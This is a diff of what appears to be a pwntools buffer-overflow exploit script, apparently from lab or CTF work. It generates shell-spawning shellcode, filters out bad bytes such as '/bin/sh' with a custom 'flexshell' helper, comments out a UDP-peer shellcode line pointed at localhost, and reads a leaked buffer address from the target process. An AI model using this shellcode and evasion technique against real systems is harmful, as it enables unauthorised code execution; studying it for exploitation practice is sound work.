@@ -15,7 +15,8 @@ bufflen = 168
 #   via UDP.
 #
 ##################################################################
-shellcode = shellcraft.udppeer('127.0.0.1',55555)
+#shellcode = shellcraft.udppeer('127.0.0.1',55555)
+#shellcode = asm(shellcode)
 ##################################################################
 
 
@@ -23,7 +24,7 @@ shellcode = shellcraft.udppeer('127.0.0.1',55555)
 # New shellcraft functionality:
 # 
 #   shellcraft.flexshell() - Removes unwanted bytes from shellcode.
-#
+#   (non functional)
 ##################################################################
 ##################################################################
 #avoid = b'/bin/sh\x00'
@@ -31,13 +32,21 @@ shellcode = shellcraft.udppeer('127.0.0.1',55555)
 ##################################################################
 
 
-
+##################################################################
+# New shellcraft functionality:
+# 
+#   flexshell - Removes unwanted bytes from shellcode.
+#   
+##################################################################
 ##################################################################
 #shellcode = flexshell.nobinsh()
 ##################################################################
 ##################################################################
+code = asm(shellcraft.sh())
+print(code)
 avoid = b'/bin/sh\x00'
-shellcode = flexshell.flex(asm(shellcraft.sh()), avoid)
+shellcode = flexshell.flex(code, avoid)
+print(shellcode)
 ##################################################################
 ##################################################################
 #shellcode = asm('mov rax, 0x3b')
@@ -53,10 +62,10 @@ shellcode = flexshell.flex(asm(shellcraft.sh()), avoid)
 #avoid = b'\x00' 
 #shellcode = flexshell.flex(shellcode, avoid)
 ##################################################################
-print(shellcode)
+#print(shellcode)
 
 sclen = len(shellcode)
-print(sclen)
+#print(sclen)
 
 p.recvuntil(b': ')
 buff_addr_str = p.recvlines(1)
